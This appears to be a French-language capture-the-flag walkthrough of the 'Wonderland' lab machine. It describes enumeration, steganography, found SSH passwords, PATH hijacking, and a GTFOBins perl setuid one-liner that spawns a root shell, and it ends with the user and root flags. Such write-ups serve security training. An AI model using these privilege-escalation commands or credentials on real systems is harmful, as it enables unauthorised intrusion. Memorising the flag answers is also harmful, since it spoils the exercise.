
# Target : 10.129.131.72

## Nmap Scan

![](/assets/IMG-20260613154933685.png)

*  Open Ports
	> 22      ====>    SSH
	> 80     ====>   http

# Web Exploitation

![](/assets/IMG-20260613155113569.png)

## Website code source inspection

![](/assets/IMG-20260613155238502.png)


## Website network interaction

![](/assets/IMG-20260613155418470.png)
## Directory Fuzzing

![](/assets/IMG-20260613161045779.png)

*  http://10.129.131.72/r/
	```html
	<!DOCTYPE html> 
	<head> 
		<title>Follow the white rabbit.</title> 
		<link rel="stylesheet" type="text/css" href="[/main.css](view-source:http://10.129.131.72/main.css)"> 
	</head> 
	<body> 
		<h1>Keep Going.</h1> 
		<p>"Would you tell me, please, which way I ought to go from here?"</p> 
	</body>
	```

*  http://10.129.131.72/poem/
```js
# The Jabberwocky

'Twas brillig, and the slithy toves  
Did gyre and gimble in the wabe;  
All mimsy were the borogoves,  
And the mome raths outgrabe.  
  
“Beware the Jabberwock, my son!  
The jaws that bite, the claws that catch!  
Beware the Jubjub bird, and shun  
The frumious Bandersnatch!”  
  
He took his vorpal sword in hand:  
Long time the manxome foe he sought —  
So rested he by the Tumtum tree,  
And stood awhile in thought.  
  
And as in uffish thought he stood,  
The Jabberwock, with eyes of flame,  
Came whiffling through the tulgey wood,  
And burbled as it came!  
  
One, two! One, two! And through and through  
The vorpal blade went snicker-snack!  
He left it dead, and with its head  
He went galumphing back.  
  
“And hast thou slain the Jabberwock?  
Come to my arms, my beamish boy!  
O frabjous day! Callooh! Callay!”  
He chortled in his joy.  
  
‘Twas brillig, and the slithy toves  
Did gyre and gimble in the wabe;  
All mimsy were the borogoves,  
And the mome raths outgrabe.
```

### Website username find 

```
cat
alice
```

## Directory listing du /img

![](/assets/IMG-20260613163433824.png)


## Recuperation en local ensuite une analyse steganographique approfondie

### Find

```
De_Alice's_Abenteuer_im_Wunderland_Carroll_pic_03
```

![](/assets/IMG-20260613163909791.png)

### Directory find

```
http://10.129.131.72/r/a/b/b/i/t/
```
![](/assets/IMG-20260613164051580.png)
### Code source inspection

![](/assets/IMG-20260613164035649.png)

## SSH Creds Find

```
alice:HowDothTheLittleCrocodileImproveHisShiningTail
```

![](/assets/IMG-20260613164214884.png)


# host Enumeration and privesc

```js
alice@wonderland:~$ sudo -l
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

### Injection de commande puis elevation de privilege vers le user rabbit

![](/assets/IMG-20260613171353452.png)

## Trouvaille dans le repertoire de rabbit

![](/assets/IMG-20260613173206472.png)


## PATH Hijacking

NOus pouvons voir dans que le binaire fait appelle au `date` or ce dernier dois nomalement faire un appelle dans le `/bin/date`

![](/assets/IMG-20260613173551295.png)

## Trouvaille dans le repertoire de hatter

![](/assets/IMG-20260613173720310.png)

### Hatter Creds

```js
hatter:WhyIsARavenLikeAWritingDesk?
```

## Capabilities

![](/assets/IMG-20260613175258429.png)

Exploitation via Gtfobins

```perl
perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh"'
```

# user.txt : 

```js
thm{"Curiouser and curiouser!"}
```
# Root.txt : 

```js
thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
```

